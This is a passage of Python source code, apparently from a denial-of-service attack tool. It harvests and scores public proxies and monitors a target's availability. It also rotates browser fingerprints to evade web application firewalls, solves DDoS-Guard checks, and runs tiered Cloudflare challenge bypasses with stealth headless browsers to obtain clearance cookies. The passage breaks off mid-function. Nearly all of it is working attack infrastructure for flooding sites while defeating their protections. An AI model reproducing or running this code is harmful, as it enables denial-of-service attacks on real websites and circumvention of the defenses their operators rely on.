            async with session.get(f"{scheme}://{target_host}:{port}", timeout=client_timeout) as response:
                content = await response.text()
                waf_keywords = ["Just a moment...", "Enable JavaScript", "Turnstile", "Cloudflare", "Attention Required"]
                if response.status in (403, 503, 429) or any(kw in content for kw in waf_keywords):
                    CURRENT_LATENCY.value = -1.0
                else:
                    CURRENT_LATENCY.value = (time() - start_t) * 1000
    except Exception:
        CURRENT_LATENCY.value = -1.0


class HealthMonitor:
    def __init__(
        self, target_host: str, port: int, method_type: str, interval: int = 2
    ):
        self.target_host = target_host
        self.port = port
        self.method_type = method_type
        self.interval = interval

    async def run(self):
        while True:
            try:
                if self.method_type == "L7":
                    scheme = "https" if self.port in (443, 8443) else "http"
                    await _check_target_latency_once(scheme, self.target_host, self.port, 5)
                else:
                    start_t = time()
                    # Async socket connect check for L4
                    reader, writer = await asyncio.open_connection(self.target_host, self.port)
                    writer.close()
                    await writer.wait_closed()
                    CURRENT_LATENCY.value = (time() - start_t) * 1000
            except Exception:
                CURRENT_LATENCY.value = -1.0  # -1 means offline or timeout
            await asyncio.sleep(self.interval)


class TacticalProxy:
    def __init__(self, base_proxy: Proxy, latency_ms: float, is_protocol_verified: bool = False, http_status: int = 0):
        self.base = base_proxy
        self.latency_ms = latency_ms
        self.is_protocol_verified = is_protocol_verified
        self.total_fails = 0
        self.consecutive_fails = 0
        self.success_count = 0
        self.http_status = http_status
        self.cooldown_until = 0
        self.score = self._calculate_initial_score()

    def _calculate_initial_score(self):
        if self.latency_ms > 15000:
            return 0
        base = max(1, 100 - (self.latency_ms / 150))
        if self.latency_ms <= 5000 and self.http_status > 0:
            base += 50
        if self.latency_ms <= 3000 and self.http_status == 200:
            base += 150
        elif self.http_status in (301, 302, 307, 308):
            base += 100
        elif self.http_status in (403, 503):
            base += 75
        elif self.http_status != 0:
            base += 20
        return base

    def update_score(self, current_failures: int):
        if current_failures > 0:
            self.total_fails += current_failures
            self.consecutive_fails += current_failures
            if self.consecutive_fails >= 5:
                # Circuit breaker: disable proxy for 60 seconds
                self.cooldown_until = time() + 60
                self.consecutive_fails = 0  # reset after triggering cooldown
        else:
            self.success_count += 1
            if self.success_count >= 2:
                self.consecutive_fails = 0 # reset consecutive failures on consistent success

        total_requests = self.total_fails + self.success_count
        success_rate = (self.success_count / total_requests) if total_requests > 0 else 1.0
        avg_latency_inverse = max(0.01, 1000.0 / max(1.0, self.latency_ms))
        uptime_factor = min(1.0, total_requests / 100.0)
        
        raw_score = (success_rate * 0.4) + (avg_latency_inverse * 0.3) + (uptime_factor * 0.3)
        self.score = raw_score * 100

        # Auto-remove proxy if score < 10 after 50+ requests
        if total_requests > 50 and self.score < 10:
            self.score = 0 # Mark for removal

    def __str__(self):
        return self.base.__str__()

    def open_socket(self, family=AF_INET, type=SOCK_STREAM, timeout=2):
        s = self.base.open_socket(family, type)
        if s:
            s.settimeout(timeout)
        return s

    @property
    def latency(self) -> float:
        return self.latency_ms

    @latency.setter
    def latency(self, value: float):
        self.latency_ms = value

    @property
    def proxy(self):
        return self.base

    @property
    def host(self):
        if hasattr(self.base, 'host'):
            return self.base.host
        if isinstance(self.base, str):
            return self.base.split(":")[0] if ":" in self.base else self.base
        return None

    @property
    def port(self):
        if hasattr(self.base, 'port'):
            return self.base.port
        if isinstance(self.base, str):
            try:
                return int(self.base.split(":")[1]) if ":" in self.base else 0
            except ValueError:
                return 0
        return 0


async def _check_proxy_async(target_host: str, proxy: Union['TacticalProxy', Proxy], timeout: float = 3.0) -> 'TacticalProxy':
    """Pure async non-blocking proxy verification."""
    from time import time
    from contextlib import suppress
    
    base_proxy = getattr(proxy, "proxy", None)
    if base_proxy is None:
        base_proxy = getattr(proxy, "base", proxy)
        
    host = getattr(proxy, "host", None)
    if host is None:
        host = getattr(base_proxy, "host", str(base_proxy).split(":")[0] if ":" in str(base_proxy) else str(base_proxy))
        
    port = getattr(proxy, "port", None)
    if port is None:
        try:
            port = getattr(base_proxy, "port", int(str(base_proxy).split(":")[1]) if ":" in str(base_proxy) else 80)
        except (ValueError, IndexError):
            port = 80
            
    start_time = time()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port),
            timeout=timeout
        )
        writer.close()
        with suppress(Exception):
            await writer.wait_closed()
        latency = (time() - start_time) * 1000
        return TacticalProxy(base_proxy, latency, True, 200)
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError, Exception):
        return TacticalProxy(base_proxy, 5000.0, False, 0)



class TacticalProxyValidator:
    @staticmethod
    def get_platform_semaphore_limit() -> int:
        import sys
        return 64 if sys.platform == "win32" else 128

    @staticmethod
    def count_elite_proxies(proxies: list) -> int:
        valid_cf_statuses = {200, 301, 302, 403, 503}
        return len([p for p in proxies if getattr(p, "latency_ms", 9999) < 3000 and getattr(p, "http_status", 0) in valid_cf_statuses])

    @staticmethod
    async def validate_and_score(raw_proxies: Set[Proxy], target_url: str = None, is_layer7: bool = True, is_udp: bool = False) -> List[TacticalProxy]:
        tactical_proxies = []
        total_raw = len(raw_proxies)
        
        if total_raw == 0:
            return []

        logger.info(
            f"{bcolors.OKBLUE}[*] Resource: Tactical scoring initiated for {total_raw:,} assets...{bcolors.RESET}"
        )

        target_host = "8.8.8.8"
        requires_ssl = False

        if target_url and is_layer7:
            parsed = urlparse(target_url)
            target_host = parsed.netloc or parsed.path
            requires_ssl = parsed.scheme == "https"

        # Pre-fetch intelligence for all proxies to eliminate database locks
        all_ip_ports = [str(p) for p in raw_proxies]
        bulk_intel = await asyncio.to_thread(INTEL_DB.get_bulk_proxy_intel, all_ip_ports)

        # OS-aware semaphore to avoid select() FD limits on Windows
        sem_limit = TacticalProxyValidator.get_platform_semaphore_limit()
        semaphore = asyncio.Semaphore(sem_limit)

        progress = [0]
        def _log_progress():
            progress[0] += 1
            if progress[0] % 100 == 0:
                logger.info(f"{bcolors.OKBLUE}[*] Resource: Tactical scoring in progress ({progress[0]}/{total_raw})...{bcolors.RESET}")

        async def _check(proxy: Proxy) -> Optional[TacticalProxy]:
            async with semaphore:
                p_str = str(proxy)
                intel = bulk_intel.get(p_str)
                
                if intel and intel['failures'] < 3 and intel['latency'] < 1500:
                    p = TacticalProxy(proxy, intel['latency'], True)
                    p.score = intel['score']
                    p.fail_count = intel['failures']
                    _log_progress()
                    return p
                    
                start_time = time()
                try:
                    is_verified = False
                    http_status = 0
                    res_str = ""

                    if is_layer7:
                        s = None
                        if CURL_CFFI_INSTALLED and target_url:
                            try:
                                from curl_cffi.requests import AsyncSession
                                px_str = f"http://{proxy}"
                                if proxy.type == ProxyType.SOCKS4: px_str = f"socks4://{proxy}"
                                elif proxy.type == ProxyType.SOCKS5: px_str = f"socks5://{proxy}"
                                
                                async with AsyncSession(proxies={"http": px_str, "https": px_str}, verify=False, timeout=3) as session:
                                    res = await session.get(target_url)
                                    http_status = res.status_code
                                    is_verified = True
                            except Exception:
                                pass # Fallback to raw TCP salvage
                        
                        if not is_verified:
                            tp = await _check_proxy_async(target_host, proxy, timeout=3.0)
                            if tp.is_protocol_verified:
                                is_verified = True
                                http_status = tp.http_status
                            else:
                                return tp
                    
                    elif is_udp and proxy.type == ProxyType.SOCKS5:
                        tp = await _check_proxy_async(target_host, proxy, timeout=5.0)
                        if tp.is_protocol_verified:
                            is_verified = True
                    else:
                        tp = await _check_proxy_async(target_host, proxy, timeout=3.0)
                        if tp.is_protocol_verified:
                            is_verified = True

                    latency = (time() - start_time) * 1000
                    if latency > 5000: return TacticalProxy(proxy, 5000.0, False, 0)
                    if not is_verified: return TacticalProxy(proxy, 5000.0, False, 0)
                        
                    tp = TacticalProxy(proxy, latency, True, http_status)
                    tp.http_status = http_status
                    tp.score = tp._calculate_initial_score()
                    _log_progress()
                    return tp
                except:
                    _log_progress()
                    return TacticalProxy(proxy, 30000.0, False, 0)

        try:
            tasks = [asyncio.create_task(_check(p)) for p in raw_proxies]
            dynamic_timeout = min(600, max(180, (total_raw // sem_limit + 1) * 8))
            results = await asyncio.wait_for(asyncio.gather(*tasks), timeout=dynamic_timeout)
            tactical_proxies = [r for r in results if r is not None and r.is_protocol_verified]
        except asyncio.TimeoutError:
            logger.warning(f"{bcolors.WARNING}[!] Resource: Validation timed out. Proceeding with partially validated pool.{bcolors.RESET}")
            tactical_proxies = [t.result() for t in tasks if t.done() and not t.cancelled() and t.result() and t.result().is_protocol_verified]
            for t in tasks:
                if not t.done():
                    t.cancel()

        elite_count = TacticalProxyValidator.count_elite_proxies(tactical_proxies)
        logger.info(
            f"{bcolors.OKGREEN}[*] Resource: Scoring complete. Elite-Tier (CF-OK & <3s): {elite_count:,} | Valid Assets (<30s): {len(tactical_proxies):,}.{bcolors.RESET}"
        )
        
        tactical_proxies.sort(key=lambda p: p.score, reverse=True)
        await asyncio.to_thread(INTEL_DB.update_proxy_scores, tactical_proxies)
        return tactical_proxies


class TacticalProxyPool:
    def __init__(self, proxies: List[TacticalProxy] = None):
        self._proxies = proxies if proxies else []
        self._failures = {} # Map proxy string to failure count
        self._lock = RLock()
        self._weights = []
        self._last_weight_update = 0
        self._update_weights()

    def report_failure(self, proxy_obj: Proxy):
        p_str = str(proxy_obj)
        with self._lock:
            self._failures[p_str] = self._failures.get(p_str, 0) + 1

    def _update_weights(self):
        with self._lock:
            if not self._proxies:
                self._weights = []
                self._pool_copy = []
                return
            for p in self._proxies:
                p_str = str(p.base)
                p.update_score(self._failures.get(p_str, 0))
            self._weights = [p.score for p in self._proxies]
            self._pool_copy = list(self._proxies) # Create a read-only copy for lock-free access
            self._failures = {} 
            self._last_weight_update = time()
            # Periodically sync to DB
            Thread(target=INTEL_DB.update_proxy_scores, args=(self._pool_copy,), daemon=True).start()

    def update_pool(self, new_proxies: List[TacticalProxy], raw_fallback: List[Proxy] = None):
        with self._lock:
            if not new_proxies and raw_fallback:
                logger.warning(f"{bcolors.WARNING}[!] Tactical Pool: No high-quality nodes found. Activating Low-Fidelity Fallback (Raw Assets)...{bcolors.RESET}")
                # Diverse sampling for Low-Fidelity Fallback
                import random as _rng
                shuffled = list(raw_fallback)
                _rng.shuffle(shuffled)
                new_proxies = [TacticalProxy(p, 3000.0, True, 0) for p in shuffled[:200]]
            
            self._proxies = new_proxies
            self._failures = {}
            self._update_weights()
            if self._proxies:
                avg_lat = sum(p.latency_ms for p in self._proxies[:50]) / min(50, len(self._proxies))
                logger.info(
                    f"{bcolors.OKGREEN}[*] Tactical Pool: {len(new_proxies):,} nodes active. Elite-Tier Latency: {avg_lat:.1f}ms{bcolors.RESET}"
                )

    def get_proxy(self) -> Optional[Proxy]:
        # Lock-free read path for maximum performance under heavy thread load
        if time() - self._last_weight_update > 60:
            self._update_weights()
            
        pool = getattr(self, '_pool_copy', [])
        weights = getattr(self, '_weights', [])
        
        if not pool: return None
        
        # Filter pool by cooldown
        now = time()
        available_pool = []
        available_weights = []
        for p, w in zip(pool, weights):
            if p.cooldown_until <= now:
                available_pool.append(p)
                available_weights.append(w)
                
        if not available_pool:
            return pool[0].base # Fallback if all are in cooldown
            
        try:
            return random.choices(available_pool, weights=available_weights, k=1)[0].base
        except:
            return available_pool[0].base

    def __len__(self):
        with self._lock: return len(self._proxies)

    def get_tactical_size(self):
        return len(self)

    def get_elite_count(self):
        with self._lock:
            return sum(1 for p in self._proxies if p.latency_ms < 3000 and p.http_status == 200)

class AutonomousHarvester:
    FALLBACK_APIS = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt"
    ]

    @staticmethod
    def fromString(line: str) -> Optional[Proxy]:
        line = line.strip()
        if not line: return None
        
        # Robust parsing for Type://IP:PORT and IP:PORT formats
        try:
            if "://" in line:
                return Proxy.fromString(line)
            
            # Default to SOCKS5 for raw IP:PORT if format unknown
            import re
            match = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)", line)
            if match:
                ip, port = match.group(1), int(match.group(2))
                return Proxy(ip, port, ProxyType.SOCKS5)
        except: pass
        return None

    @staticmethod
    def emergency_harvest(proxy_ty: int) -> Set[Proxy]:
        logger.warning(f"{bcolors.FAIL}[!] EMERGENCY PROTOCOL: Autonomous Sourcing Activated. Initiating deep global scrape...{bcolors.RESET}")
        proxies = set()
        
        # 1. Load User-Defined Sources from config.json
        user_sources = []
        try:
            config_path = get_data_path() / "config.json"
            if config_path.exists():
                with open(config_path, "r", encoding="utf-8") as f:
                    import json
                    config_data = json.load(f)
                    providers = config_data.get("proxy-providers", [])
                    for p in providers:
                        p_url = p.get("url")
                        p_type = p.get("type")
                        if p_url and (p_type == 0 or p_type == proxy_ty):
                            user_sources.append(p_url)
        except Exception as e:
            logger.debug(f"[!] Config Load Failed: {e}")

        # 2. Combine with Global Fallback Matrices
        all_sources = list(set(user_sources + AutonomousHarvester.FALLBACK_APIS))
        
        if user_sources:
            logger.info(f"{bcolors.OKCYAN}[*] Resource: Prioritizing {len(user_sources)} user-defined tactical origins.{bcolors.RESET}")

        def _fetch(url):
            try:
                res = get(url, timeout=10)
                if res.status_code == 200:
                    for line in res.text.splitlines():
                        p = AutonomousHarvester.fromString(line)
                        if p: proxies.add(p)
            except: pass

        # Parallel fetching for maximum speed
        with ThreadPoolExecutor(max_workers=min(20, len(all_sources))) as executor:
            executor.map(_fetch, all_sources)
            
        logger.info(f"{bcolors.WARNING}[*] EMERGENCY PROTOCOL: Successfully recovered {len(proxies):,} raw assets from prioritized matrices.{bcolors.RESET}")
        return proxies


class ReloadSentinel(Thread):
    def __init__(
        self, interval_mins: int, con, proxy_arg, proxy_ty, pool: TacticalProxyPool, url=None
    ):
        Thread.__init__(self, daemon=True)
        self.interval = interval_mins * 60
        self.con = con
        self.proxy_arg = proxy_arg
        self.proxy_ty = proxy_ty
        self.pool = pool
        self.url = url

    def run(self):
        if self.interval <= 0:
            return

        last_refresh = time() - self.interval # Force immediate check if needed, but wait it already initialized pool.
        # Actually, let's start last_refresh at now.
        last_refresh = time()
        jitter = random.uniform(0, 30)

        while True:
            sleep(5)
            now = time()
            
            pool_depleted = self.pool.get_tactical_size() < 10
            time_to_refresh = (now - last_refresh) >= (self.interval + jitter)

            if not pool_depleted and not time_to_refresh:
                continue

            last_refresh = now
            jitter = random.uniform(0, 30)
            
            # Check if pool is critically low
            if pool_depleted:
                logger.warning(f"{bcolors.FAIL}[!] Sentinel Alert: Tactical Pool Depleted ({self.pool.get_tactical_size()} active). Executing Emergency Sourcing.{bcolors.RESET}")
                raw_emergency = AutonomousHarvester.emergency_harvest(self.proxy_ty)
                if raw_emergency:
                    scored_emergency = asyncio.run(TacticalProxyValidator.validate_and_score(raw_emergency, str(self.url) if self.url else None))
                    self.pool.update_pool(scored_emergency, list(raw_emergency))
                continue

            logger.info(
                f"{bcolors.OKCYAN}[*] Sentinel: Periodic proxy refresh initiated...{bcolors.RESET}"
            )
            try:
                new_proxies = handleProxyList(
                    self.con, self.proxy_arg, self.proxy_ty, self.url
                )
                if new_proxies:
                    # In handleProxyList we return normal Proxies if from file/url directly.
                    # We need to ensure they are scored here if they aren't already.
                    if isinstance(new_proxies, list) and len(new_proxies) > 0 and isinstance(new_proxies[0], TacticalProxy):
                        self.pool.update_pool(new_proxies, [p.base for p in new_proxies])
                    else:
                        scored = asyncio.run(TacticalProxyValidator.validate_and_score(set(new_proxies), str(self.url) if self.url else None))
                        self.pool.update_pool(scored, list(new_proxies))
            except Exception as e:
                logger.error(
                    f"{bcolors.FAIL}[!] Sentinel Error during refresh: {e}{bcolors.RESET}"
                )


class Tools:
    IP = re.compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = re.compile('"protocol":(\\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B",
            "k{}B",
            "M{}B",
            "G{}B",
            "T{}B",
            "P{}B",
            "E{}B",
            "Z{}B",
            "Y{}B",
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2) -> Union[str, int]:
        suffixes = ["", "k", "m", "g", "t", "p"]
        if num > 999:
            obje = sum([abs(num / 1000.0**x) >= 1 for x in range(1, len(suffixes))])
            return f"{num / 1000.0**obje:.{precision}f}{suffixes[obje]}"
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len(
            "\r\n".join(f"{key}: {value}" for key, value in res.request.headers.items())
        )
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1",
            }
            with s.get(url, headers=hdrs, timeout=10) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            with s.post(
                "https://check.ddos-guard.net/check.js", headers=hdrs, timeout=10
            ) as ss:
                for key, value in ss.cookies.items():
                    if key == "__ddg2":
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            with s.get(
                f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs, timeout=10
            ) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s
        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


class MLSmartBypassEngine:
    """Adaptive Heuristic Feedback Loop for WAF Evasion (ML-inspired)"""
    def __init__(self):
        self.lock = Lock()
        self.intensity = 15 # Default intensity (0-50%)
        self.fingerprints = [
            {
                "id": "chrome_win_133",
                "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                "headers": (
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
                    "Accept-Encoding: gzip, deflate, br, zstd\r\n"
                    "Accept-Language: en-US,en;q=0.9\r\n"
                    "Sec-Ch-Ua: \"Chromium\";v=\"133\", \"Google Chrome\";v=\"133\", \"Not-A.Brand\";v=\"99\"\r\n"
                    "Sec-Ch-Ua-Mobile: ?0\r\n"
                    "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
                    "Sec-Fetch-Dest: document\r\n"
                    "Sec-Fetch-Mode: navigate\r\n"
                    "Sec-Fetch-Site: none\r\n"
                    "Sec-Fetch-User: ?1\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n"
                ),
                "weight": 10.0,
                "delay": 0.0
            },
            {
                "id": "firefox_mac_135",
                "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
                "headers": (
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                    "Accept-Encoding: gzip, deflate, br\r\n"
                    "Accept-Language: en-US,en;q=0.5\r\n"
                    "Sec-Fetch-Dest: document\r\n"
                    "Sec-Fetch-Mode: navigate\r\n"
                    "Sec-Fetch-Site: none\r\n"
                    "Sec-Fetch-User: ?1\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n"
                ),
                "weight": 10.0,
                "delay": 0.1
            },
            {
                "id": "safari_ios_18",
                "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
                "headers": (
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Encoding: gzip, deflate, br\r\n"
                    "Accept-Language: en-US,en;q=0.9\r\n"
                    "Sec-Fetch-Dest: document\r\n"
                    "Sec-Fetch-Mode: navigate\r\n"
                    "Sec-Fetch-Site: none\r\n"
                ),
                "weight": 10.0,
                "delay": 0.05
            }
        ]
        self.current_best = self.fingerprints[0]
        self.total_requests = 0
        self.total_blocks = 0

    def get_fingerprint(self):
        with self.lock:
            # Roulette wheel selection based on weight
            total_weight = sum(f["weight"] for f in self.fingerprints)
            if total_weight <= 0:
                for f in self.fingerprints: f["weight"] = 10.0
                total_weight = sum(f["weight"] for f in self.fingerprints)
            
            pick = random.uniform(0, total_weight)
            current = 0
            for f in self.fingerprints:
                current += f["weight"]
                if current > pick:
                    # Apply intensity scaling to delay (Pro-Max feature)
                    scaled_f = f.copy()
                    scaled_f["delay"] = f["delay"] * (self.intensity / 15.0)
                    
                    if self.current_best["id"] != f["id"]:
                        logger.debug(f"[*] ML_ENGINE: Switching active fingerprint to {f['id']} (Weight: {f['weight']:.1f}, Intensity: {self.intensity}%)")
                        self.current_best = f
                    return scaled_f
            return self.fingerprints[0]

    def report_result(self, fp_id: str, success: bool):
        with self.lock:
            for f in self.fingerprints:
                if f["id"] == fp_id:
                    if success:
                        f["weight"] = min(50.0, f["weight"] * 1.05) # Reward
                        logger.debug(f"[*] ML_ENGINE: Pattern {fp_id} SUCCESS. Weight increased to {f['weight']:.1f}")
                    else:
                        f["weight"] = max(1.0, f["weight"] * 0.8) # Penalize
                        logger.debug(f"[!] ML_ENGINE: Pattern {fp_id} FAILED/BLOCKED. Weight decreased to {f['weight']:.1f}")
                    break

ML_ENGINE = MLSmartBypassEngine()


class BrowserEngine:
    """Advanced Browser Fingerprinting Engine for bypassing JS/Captcha challenges"""
    
    @staticmethod
    def get_curl_profile(ua: str) -> str:
        """Map User-Agent to ultra-modern curl_cffi impersonate profile."""
        if not ua: return random.choice(["chrome124", "chrome131", "safari17_0", "firefox135"])
        ua_low = ua.lower()

        # Chrome - Primary bypass vector
        if "chrome" in ua_low:
            return random.choice(["chrome120", "chrome124", "chrome131"])

        # Firefox - Alternative
        if "firefox" in ua_low:
            return random.choice(["firefox133", "firefox135"])

        # Safari - High fidelity for mobile
        if "safari" in ua_low:
            return random.choice(["safari15_5", "safari17_0"])

        return "chrome124"
    @staticmethod
    def export_session_stats(target_host, method, duration):
        """Export session analytics to output directory."""
        try:
            output_dir = get_data_path() / "output"
            output_dir.mkdir(parents=True, exist_ok=True)
            stats = {
                "target": target_host,
                "method": method,
                "duration": duration,
                "timestamp": datetime.now().isoformat(),
                "metrics": {
                    "requests": int(REQUESTS_SENT),
                    "success": int(SUCCESS_SENT),
                    "waf": int(WAF_SENT),
                    "errors": int(ERROR_SENT),
                    "timeouts": int(TIMEOUT_SENT),
                    "bytes": int(BYTES_SEND)
                }
            }
            filename = output_dir / f"stats_{int(time())}.json"
            with open(filename, "w") as f:
                json.dump(stats, f, indent=4)
            logger.info(f"{bcolors.OKGREEN}[*] Analytics: Dashboard data exported to {filename}{bcolors.RESET}")
        except: pass

    @staticmethod
    def _solve_tier1_lightweight(url: str, proxy: str = None, user_agent: str = None, timeout: int = 10):
        # 1a. Cloudscraper
        try:
            from cloudscraper import create_scraper
            scraper = create_scraper()
            if proxy:
                p_url = f"http://{proxy}" if "://" not in proxy else proxy
                scraper.proxies = {"http": p_url, "https": p_url}
            resp = scraper.get(url, timeout=timeout)
            if resp.status_code < 403:
                cookie_str = "; ".join([f"{k}={v}" for k, v in resp.cookies.items()])
                if "cf_clearance" in cookie_str:
                    ua = resp.request.headers.get("User-Agent", user_agent)
                    return cookie_str, ua
            else:
                BypassDebugger.capture_failure("Tier 1 (Cloudscraper)", url, error_msg=f"HTTP {resp.status_code}", response_obj=resp)
        except Exception as e:
            BypassDebugger.capture_failure("Tier 1 (Cloudscraper)", url, error_msg=str(e))

        # 1b. curl_cffi
        if CURL_CFFI_INSTALLED:
            try:
                from curl_cffi.requests import Session as CurlSyncSession
                profile = BrowserEngine.get_curl_profile(user_agent)
                with CurlSyncSession(impersonate=profile) as cs:
                    if proxy:
                        p_url = f"http://{proxy}" if "://" not in proxy else proxy
                        cs.proxies = {"http": p_url, "https": p_url}
                    resp = cs.get(url, timeout=timeout, allow_redirects=True)
                    if resp.status_code < 403:
                        cookie_str = "; ".join([f"{k}={v}" for k, v in resp.cookies.items()])
                        if "cf_clearance" in cookie_str:
                            return cookie_str, user_agent
            except Exception:
                pass
        
        return None, None

    @staticmethod
    def _solve_tier2_fast_cdp(url: str, proxy: str = None, user_agent: str = None, timeout: int = 15):
        # 2a. Botasaurus
        if BOTASAURUS_INSTALLED:
            try:
                from botasaurus.browser import browser, Driver
                def get_proxy(data): return data.get("proxy")
                
                @browser(proxy=get_proxy, block_images_and_css=True, headless=True, close_on_crash=True)
                def bot_solve(driver: Driver, data):
                    try:
                        driver.google_get(data["url"], bypass_cloudflare=True)
                        cookies = driver.get_cookies_dict()
                        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
                        ua = driver.run_js("return navigator.userAgent")
                        if "cf_clearance" in cookie_str:
                            return cookie_str, ua
                    except Exception as e:
                        BypassDebugger.capture_failure("Tier 2 (Botasaurus)", data["url"], page_obj=driver, error_msg=str(e))
                    return None, None
                
                res = bot_solve([{"url": url, "proxy": proxy}])
                if res and res[0] and res[0][0]:
                    return res[0][0], res[0][1]
            except Exception as e:
                BypassDebugger.capture_failure("Tier 2 (Botasaurus-Launch)", url, error_msg=str(e))
                
        # 2b. Nodriver
        if NODRIVER_INSTALLED:
            try:
                import nodriver as uc
                import asyncio
                async def _nd_solve():
                    browser = await uc.start()
                    try:
                        page = await browser.get(url)
                        await asyncio.sleep(3)
                        cookies = await page.get_cookies()
                        cookie_str = "; ".join([f"{c.name}={c.value}" for c in cookies])
                        ua = await page.evaluate("navigator.userAgent")
                        if "cf_clearance" in cookie_str:
                            return cookie_str, ua
                        BypassDebugger.capture_failure("Tier 2 (Nodriver)", url, page_obj=page, error_msg="Challenge not solved")
                    except Exception as e:
                        BypassDebugger.capture_failure("Tier 2 (Nodriver)", url, error_msg=str(e))
                    finally:
                        browser.stop()
                    return None, None
                cookie, ua = asyncio.run(_nd_solve())
                if cookie: return cookie, ua
            except Exception:
                pass

        # 2c. DrissionPage
        if DRISSION_INSTALLED:
            try:
                from DrissionPage import ChromiumPage, ChromiumOptions
                co = ChromiumOptions()
                co.auto_port()
                co.set_argument('--headless=new')
                if proxy:
                    p_url = f"http://{proxy}" if "://" not in proxy else proxy
                    co.set_argument(f'--proxy-server={p_url}')
                page = ChromiumPage(co)
                try:
                    page.get(url, timeout=timeout)
                    from time import sleep
                    for _ in range(5):
                        sleep(1)
                        cookies = page.cookies()
                        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                        if "cf_clearance" in cookie_str:
                            ua = page.run_js("return navigator.userAgent")
                            return cookie_str, ua
                    BypassDebugger.capture_failure("Tier 2 (DrissionPage)", url, page_obj=page, error_msg="Challenge not solved")
                except Exception as e:
                    BypassDebugger.capture_failure("Tier 2 (DrissionPage)", url, page_obj=page, error_msg=str(e))
                finally:
                    page.quit()
            except Exception:
                pass

        return None, None

    @staticmethod
    def _solve_tier3_heavy_stealth(url: str, proxy: str = None, user_agent: str = None, timeout: int = 30):
        # 3a. CloakBrowser (Source-level patches + Humanize)
        if CLOAKBROWSER_INSTALLED:
            try:
                import random
                p_url = f"http://{proxy}" if proxy and "://" not in proxy else proxy
                
                # Use humanize and geoip for maximum stealth
                browser = cloakbrowser_launch(
                    headless=True, 
                    humanize=True, 
                    geoip=True if proxy else False,
                    proxy=p_url
                )
                try:
                    context = browser.new_context(user_agent=user_agent) if user_agent else browser.new_context()
                    page = context.new_page()
                    try:
                        page.goto(url, timeout=timeout * 1000)
                        
                        from time import sleep
                        for i in range(15):
                            sleep(2)
                            cookies = context.cookies()
                            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                            if "cf_clearance" in cookie_str:
